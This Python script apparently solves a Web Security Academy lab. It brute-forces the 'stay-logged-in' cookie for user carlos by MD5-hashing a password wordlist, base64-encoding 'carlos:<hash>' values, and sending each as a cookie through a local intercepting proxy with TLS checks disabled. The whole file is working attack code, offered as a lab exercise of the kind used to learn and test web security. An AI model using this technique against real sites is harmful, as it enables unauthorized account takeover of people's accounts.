import requests
import hashlib
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_encode(data):
    return base64.b64encode(data.encode()).decode()
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
def md5_hash(password):
    return hashlib.md5(password.encode()).hexdigest()
hashed_passwords = []
with open('passwords.txt', 'r') as file:
    for line in file:
        password = line.strip()
        hashed_password = md5_hash(password)
        hashed_password = 'carlos:' + hashed_password
        print(f'MD5 Hash: {hashed_password}')
        hashed_password = base64_encode(hashed_password)

        hashed_passwords.append(hashed_password)
print(hashed_passwords)

# Function to brute-force with custom headers and log response time
def brute_force(url, hashed_passwords):
        for hash in hashed_passwords:
            headers = {
                "Host": "0a5e004304286a3e814e0294000200b0.web-security-academy.net",
                "Cookie": "stay-logged-in=" + hash,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Referer": "https://0a5e004304286a3e814e0294000200b0.web-security-academy.net/login",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Priority": "u=0, i",
                "Te": "trailers",
                "Connection": "keep-alive"
            }

            # Send POST request with credentials
            response = requests.get(url, headers=headers,proxies=proxies, verify=False)
            print(f"Trying header {headers}")

brute_force("https://0a5e004304286a3e814e0294000200b0.web-security-academy.net/my-account?id=carlos", hashed_passwords)